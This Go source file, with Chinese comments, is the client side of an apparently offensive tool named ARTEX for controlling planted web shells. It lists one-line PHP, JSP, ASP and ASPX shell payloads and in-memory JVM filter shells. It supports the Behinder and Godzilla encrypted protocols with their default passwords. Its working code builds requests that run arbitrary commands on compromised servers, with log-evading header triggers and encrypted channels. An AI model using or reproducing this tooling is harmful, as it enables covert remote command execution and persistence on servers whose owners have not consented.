// Package webshell 实现「一句话马」的客户端协议：把一条命令（或一段代码）编成
// 对目标马文件的 HTTP 请求，再从响应里切出真实输出。
//
// 两类协议并存：
//   - 原生协议（php_eval / jsp_runtime / ...）：ARTEX 自己生成的马，载荷走参数，
//     响应用随机标记切分；
//   - 第三方加密协议（冰蝎 3/4、哥斯拉 4）：沿用对方的请求加密与密钥派生，命令
//     放进自定义请求头，由本包提供的 payload（PHP 源码 / JSP class / C# DLL）
//     在目标侧执行。具体线格式见 protocol.go。
//
// 所有用户输入都经 base64 或表单编码后再进入请求体，不参与代码字符串拼接；
// 随机标记只由本包生成（十六进制），不会被响应里的其他内容误切。
package webshell

import (
	"crypto/rand"
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"strings"
)

// 支持的马类型。取值与 webshells.shell_type 一致，server 侧白名单校验。
const (
	TypePHPEval   = "php_eval"    // <?php @eval($_POST['pass']); ?>       命令/代码
	TypePHPAssert = "php_assert"  // <?php @assert($_POST['pass']); ?>      命令/代码（PHP<8）
	TypePHPCmd    = "php_cmd"     // <?php system($_REQUEST['cmd']); ?>     仅命令，裸输出
	TypeJSP       = "jsp_runtime" // Runtime.exec 型 jsp/jspf 马
	TypeASP       = "asp_exec"    // WScript.Shell 型 asp 马
	TypeASPX      = "aspx_exec"   // Process 型 aspx 马
	// 内存马：没有马文件，收命令的 Filter/Handler 驻留在进程里，URL 填任意被
	// 它接管的路径即可。两种触发方式的区别只在命令从哪读。
	TypeJSPMemory       = "jsp_memory"        // 参数触发：POST 参数携带 base64 载荷
	TypeJSPMemoryHeader = "jsp_memory_header" // 请求头触发：自定义头携带 base64 载荷

	// 冰蝎 3：固定 AES-128-ECB（PHP 为 CBC 零 IV），密钥 = md5(密码)[:16]。
	TypeBehinder3PHP  = "behinder3_php"
	TypeBehinder3JSP  = "behinder3_jsp"
	TypeBehinder3ASPX = "behinder3_aspx"
	// 冰蝎 4：AES-128-ECB / 带 magic 尾巴 / XOR，加密方式见 Target.Crypto。
	TypeBehinder4PHP  = "behinder4_php"
	TypeBehinder4JSP  = "behinder4_jsp"
	TypeBehinder4ASPX = "behinder4_aspx"
	// 哥斯拉 4：密钥 = md5(secretKey)[:16]，pass 同时是表单字段名。
	TypeGodzilla4PHP  = "godzilla4_php"
	TypeGodzilla4JSP  = "godzilla4_jsp"
	TypeGodzilla4ASPX = "godzilla4_aspx"

	// ARTEX 自研加密通道：AES-256-CBC + HMAC-SHA256 信封，见 artexcrypt.go。
	TypeArtexCryptPHP  = "artex_crypt_php"
	TypeArtexCryptJSP  = "artex_crypt_jsp"
	TypeArtexCryptASPX = "artex_crypt_aspx"
)

// 执行方式。
const (
	ModeCommand = "command" // 执行系统命令
	ModeCode    = "code"    // 执行代码（仅 php_eval / php_assert）
)

var (
	ErrUnknownType      = errors.New("未知的 WebShell 类型")
	ErrModeNotSupported = errors.New("该 WebShell 类型不支持代码执行模式")
	ErrEmptyInput       = errors.New("命令或代码不能为空")
	ErrBadHeaderName    = errors.New("请求头触发型的参数名不是合法头名")
)

// Descriptor 描述一种马类型，供 UI 展示与生成马文件。
type Descriptor struct {
	Type     string
	Label    string
	Filename string
	// CodeMode 为 true 时该类型可切「执行代码」而不只是系统命令。
	CodeMode bool
	// DefaultParam 是默认连接参数名。
	DefaultParam string
	Note         string

	// Family/Language 标记第三方加密协议；Family 为空表示 ARTEX 原生协议。
	Family   string
	Language string
	// ParamUnused 表示该类型不靠普通参数收命令（加密马走自定义头）。
	ParamUnused bool
	// Cryptos/DefaultCrypto 是冰蝎 4 可选的加密方式；为空表示固定或原生。
	Cryptos       []string
	DefaultCrypto string
	// DefaultSecret/DefaultSecretKey 是连接口令（冰蝎密码 / 哥斯拉 pass 与密钥）。
	DefaultSecret    string
	DefaultSecretKey string
}

// HasCrypto reports whether name is one of the type's supported ciphers.
func (d Descriptor) HasCrypto(name string) bool {
	for _, c := range d.Cryptos {
		if c == name {
			return true
		}
	}
	return false
}

var descriptors = []Descriptor{
	{Type: TypePHPEval, Label: "PHP eval 一句话", Filename: "shell.php", CodeMode: true, DefaultParam: "pass",
		Note: "POST 参数值为 PHP 代码；命令与代码两种模式都支持。"},
	{Type: TypePHPAssert, Label: "PHP assert 一句话", Filename: "shell.php", CodeMode: true, DefaultParam: "pass",
		Note: "assert 收代码，PHP 8 已移除，适用于 5.x/7.x。"},
	{Type: TypePHPCmd, Label: "PHP 命令回显（裸输出）", Filename: "shell.php", CodeMode: false, DefaultParam: "cmd",
		Note: "system() 直接回显，输出无边界标记，错误与结果混在一起。"},
	{Type: TypeJSP, Label: "JSP Runtime 马", Filename: "shell.jsp", CodeMode: false, DefaultParam: "pass",
		Note: "马文件自身按 os.name 选择 cmd.exe / /bin/sh。"},
	{Type: TypeASP, Label: "ASP WScript 马", Filename: "shell.asp", CodeMode: false, DefaultParam: "pass",
		Note: "经典 ASP，走 %ComSpec% /c。"},
	{Type: TypeASPX, Label: "ASPX Process 马", Filename: "shell.aspx", CodeMode: false, DefaultParam: "pass",
		Note: "IIS 应用页，Process.Start。"},
	{Type: TypeJSPMemory, Label: "JVM 内存马（参数触发）", Filename: "ArtexFilter.java", CodeMode: false, DefaultParam: "pass",
		Note: "无马文件，驻留 Filter 读 POST 参数；URL 填任意被它接管的路径（如 /index.jsp、/favicon.ico）。"},
	{Type: TypeJSPMemoryHeader, Label: "JVM 内存马（请求头触发）", Filename: "ArtexFilter.java", CodeMode: false, DefaultParam: "X-Token",
		Note: "命令放在自定义请求头里，参数名即头名，不出现在访问日志的 query 中；用 GET 发送。"},

	{Type: TypeBehinder3PHP, Label: "冰蝎 3 PHP", Filename: "shell.php", DefaultParam: "pass",
		Family: FamilyBehinder3, Language: "php", ParamUnused: true, DefaultSecret: "rebeyond",
		Note: "连接已有冰蝎 3 PHP 马，或生成配套马；密钥 = md5(密码) 前 16 位。"},
	{Type: TypeBehinder3JSP, Label: "冰蝎 3 JSP", Filename: "shell.jsp", DefaultParam: "pass",
		Family: FamilyBehinder3, Language: "jsp", ParamUnused: true, DefaultSecret: "rebeyond",
		Note: "连接已有冰蝎 3 JSP 马，或生成配套马；AES-128-ECB。"},
	{Type: TypeBehinder3ASPX, Label: "冰蝎 3 ASPX", Filename: "shell.aspx", DefaultParam: "pass",
		Family: FamilyBehinder3, Language: "aspx", ParamUnused: true, DefaultSecret: "rebeyond",
		Note: "连接已有冰蝎 3 ASPX 马，或生成配套马；AES-128-CBC(IV=密钥)。"},

	{Type: TypeBehinder4PHP, Label: "冰蝎 4 PHP", Filename: "shell.php", DefaultParam: "pass",
		Family: FamilyBehinder4, Language: "php", ParamUnused: true, DefaultSecret: "rebeyond",
		Cryptos: []string{CryptoBehinderAES, CryptoBehinderAESMagic, CryptoBehinderXORB64}, DefaultCrypto: CryptoBehinderAES,
		Note: "支持 AES / magic 尾巴 / XOR-base64；PHP 无裸 XOR 协议。"},
	{Type: TypeBehinder4JSP, Label: "冰蝎 4 JSP", Filename: "shell.jsp", DefaultParam: "pass",
		Family: FamilyBehinder4, Language: "jsp", ParamUnused: true, DefaultSecret: "rebeyond",
		Cryptos: []string{CryptoBehinderAES, CryptoBehinderAESMagic, CryptoBehinderXOR, CryptoBehinderXORB64}, DefaultCrypto: CryptoBehinderAES,
		Note: "四种传输协议全支持，需与目标马实际使用的一致。"},
	{Type: TypeBehinder4ASPX, Label: "冰蝎 4 ASPX", Filename: "shell.aspx", DefaultParam: "pass",
		Family: FamilyBehinder4, Language: "aspx", ParamUnused: true, DefaultSecret: "rebeyond",
		Cryptos: []string{CryptoBehinderAES}, DefaultCrypto: CryptoBehinderAES,
		Note: "冰蝎 4 的 ASPX 只有 AES（base64 + AES-128-ECB）。"},

	{Type: TypeGodzilla4PHP, Label: "哥斯拉 4 PHP", Filename: "shell.php", DefaultParam: "pass",
		Family: FamilyGodzilla4, Language: "php", ParamUnused: true, DefaultSecret: "pass", DefaultSecretKey: "key",
		Note: "表单字段名即 pass；密钥经 md5 取前 16 位。首次请求需引导 payload。"},
	{Type: TypeGodzilla4JSP, Label: "哥斯拉 4 JSP", Filename: "shell.jsp", DefaultParam: "pass",
		Family: FamilyGodzilla4, Language: "jsp", ParamUnused: true, DefaultSecret: "pass", DefaultSecretKey: "key",
		Note: "AES-128-ECB；payload 缓存在服务端 session，连接需保留 Cookie。"},
	{Type: TypeGodzilla4ASPX, Label: "哥斯拉 4 ASPX / C#", Filename: "shell.aspx", DefaultParam: "pass",
		Family: FamilyGodzilla4, Language: "aspx", ParamUnused: true, DefaultSecret: "pass", DefaultSecretKey: "key",
		Note: "AES-128-CBC(IV=密钥)；payload 缓存在服务端 session。"},

	{Type: TypeArtexCryptPHP, Label: "ARTEX 加密 PHP（自研）", Filename: "artex.php", DefaultParam: "d",
		Family: FamilyArtexCrypt, Language: "php", DefaultSecret: "artex",
		Note: "AES-256-CBC + HMAC-SHA256，随机 IV、base64url、诱饵字段；命令与回显均不明文。"},
	{Type: TypeArtexCryptJSP, Label: "ARTEX 加密 JSP（自研）", Filename: "artex.jsp", DefaultParam: "d",
		Family: FamilyArtexCrypt, Language: "jsp", DefaultSecret: "artex",
		Note: "AES-256-CBC + HMAC-SHA256 信封，适合 Tomcat 8/9；命令与回显均不明文。"},
	{Type: TypeArtexCryptASPX, Label: "ARTEX 加密 ASPX（自研）", Filename: "artex.aspx", DefaultParam: "d",
		Family: FamilyArtexCrypt, Language: "aspx", DefaultSecret: "artex",
		Note: "AES-256-CBC + HMAC-SHA256 信封，.NET Framework 4.x 可用；命令与回显均不明文。"},
}

// Types 返回支持的马类型目录（UI 下拉、agent 工具 schema 同源）。
func Types() []Descriptor { return descriptors }

// Lookup 返回某个类型的描述信息，供 server 侧做默认值与校验。
func Lookup(shellType string) (Descriptor, bool) { return descriptorOf(shellType) }

// ValidType reports whether s is a supported shell type.
func ValidType(s string) bool {
	for _, d := range descriptors {
		if d.Type == s {
			return true
		}
	}
	return false
}

func descriptorOf(s string) (Descriptor, bool) {
	for _, d := range descriptors {
		if d.Type == s {
			return d, true
		}
	}
	return Descriptor{}, false
}

// Target 是一次连接所需的全部参数（对应 webshells 表一行）。
type Target struct {
	URL         string
	Type        string
	Param       string
	OSType      string // linux / windows / "" = 由马自身探测
	InsecureTLS bool
	// 第三方加密协议参数：冰蝎密码 / 哥斯拉 pass 与密钥 / 冰蝎 4 加密方式。
	Secret    string
	SecretKey string
	Crypto    string
}

func (t *Target) param() string {
	if strings.TrimSpace(t.Param) == "" {
		if d, ok := descriptorOf(t.Type); ok {
			return d.DefaultParam
		}
		return "pass"
	}
	return t.Param
}

// validHeaderName reports whether s is an RFC 7230 token, i.e. usable as an HTTP
// header name. 头名来自用户填的参数名，不能含冒号/空格/换行，否则会破坏请求行。
func validHeaderName(s string) bool {
	if s == "" {
		return false
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		ok := (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')
		if !ok {
			ok = strings.IndexByte("!#$%&'*+-.^_`|~", c) >= 0
		}
		if !ok {
			return false
		}
	}
	return true
}

// Plan 是已经编好的请求：方法 + 表单体 + 解析输出的方式。
type Plan struct {
	Method      string
	ContentType string
	Body        string
	// Header 非空时 Body 改为放进这个请求头（内存马按头触发），请求体留空。
	Header string
	// Raw 为 true 时响应体即命令输出，不做标记切分（php_cmd）。
	Raw bool

	begin string
	end   string
}

// Parse 从响应体里取出命令输出。带标记的马返回 (输出, true)；响应里没有成对标记
// （马没生效、被 WAF 拦截、返回了错误页）时返回 (原文, false)，调用方据此判失败。
func (p *Plan) Parse(body string) (string, bool) {
	if p.Raw {
		return body, true
	}
	i := strings.Index(body, p.begin)
	if i < 0 {
		return body, false
	}
	rest := body[i+len(p.begin):]
	j := strings.Index(rest, p.end)
	if j < 0 {
		return body, false
	}
	return strings.TrimSpace(rest[:j]), true
}

// marker 生成一对只含十六进制的随机边界，避免与输出内容相撞。
func marker() (begin, end string, err error) {
	var b [6]byte
	if _, err = rand.Read(b[:]); err != nil {
		return "", "", err
	}
	h := fmt.Sprintf("%x", b[:])
	return "ARTXB" + h, h + "ARTXE", nil
}

// Build 把 input（命令或代码）编成对目标马的请求。mode 为 ModeCommand / ModeCode。
func Build(t *Target, mode, input string) (*Plan, error) {
	if mode == "" {
		mode = ModeCommand
	}
	if strings.TrimSpace(input) == "" {
		return nil, ErrEmptyInput
	}
	if !ValidType(t.Type) {
		return nil, ErrUnknownType
	}
	if IsEncryptedType(t.Type) {
		// 加密马的请求体是密文，不能套用原生标记协议。
		return nil, ErrXProtocol
	}
	if mode == ModeCode && t.Type != TypePHPEval && t.Type != TypePHPAssert {
		return nil, ErrModeNotSupported
	}

	begin, end, err := marker()
	if err != nil {
		return nil, err
	}
	p := &Plan{Method: "POST", ContentType: "application/x-www-form-urlencoded", begin: begin, end: end}
	form := url.Values{}

	switch t.Type {
	case TypePHPCmd:
		// 马文件本身就是 system($_REQUEST['cmd'])，没有代码求值能力：
		// 命令原样作表单值发过去，响应体整个当输出。
		p.Raw = true
		form.Set(t.param(), input)
	case TypePHPEval, TypePHPAssert:
		if mode == ModeCode {
			form.Set(t.param(), phpCodePayload(input, begin, end))
		} else {
			form.Set(t.param(), phpCmdPayload(input, begin, end))
		}
	case TypeJSP, TypeASPX, TypeJSPMemory:
		// 单个参数携带 base64(begin \n end \n command)，马文件解码后自行分割。
		form.Set(t.param(), base64.StdEncoding.EncodeToString(
			[]byte(begin+"\n"+end+"\n"+input)))
	case TypeJSPMemoryHeader:
		// 命令不进请求体，改放自定义头：URL/参数里查不到痕迹，GET 即可触发。
		if !validHeaderName(t.param()) {
			return nil, ErrBadHeaderName
		}
		p.Method = "GET"
		p.ContentType = ""
		p.Header = t.param()
		p.Body = base64.StdEncoding.EncodeToString([]byte(begin + "\n" + end + "\n" + input))
		return p, nil
	case TypeASP:
		form.Set("b", begin)
		form.Set("e", end)
		form.Set(t.param(), input)
	default:
		return nil, ErrUnknownType
	}
	p.Body = form.Encode()
	return p, nil
}

// phpCmdPayload 生成送进 eval/assert 的 PHP 代码：按可用性依次尝试常见执行函数，
// 命令本身 base64 传输，不参与字符串拼接。
func phpCmdPayload(cmd, begin, end string) string {
	return "$__c=base64_decode('" + base64.StdEncoding.EncodeToString([]byte(cmd)) + "');$__o='';" +
		"if(function_exists('shell_exec')){$__o=@shell_exec($__c);}" +
		"elseif(function_exists('system')){ob_start();@system($__c);$__o=ob_get_clean();}" +
		"elseif(function_exists('passthru')){ob_start();@passthru($__c);$__o=ob_get_clean();}" +
		"elseif(function_exists('popen')){$__h=@popen($__c,'r');if($__h){while(!feof($__h)){$__o.=fread($__h,4096);}@pclose($__h);}}" +
		"echo '" + begin + "'.$__o.'" + end + "';"
}

// phpCodePayload 让用户的 PHP 代码在输出缓冲里执行，回显一并收进标记之间。
func phpCodePayload(code, begin, end string) string {
	return "ob_start();@eval(base64_decode('" + base64.StdEncoding.EncodeToString([]byte(code)) + "'));" +
		"$__o=ob_get_clean();echo '" + begin + "'.$__o.'" + end + "';"
}
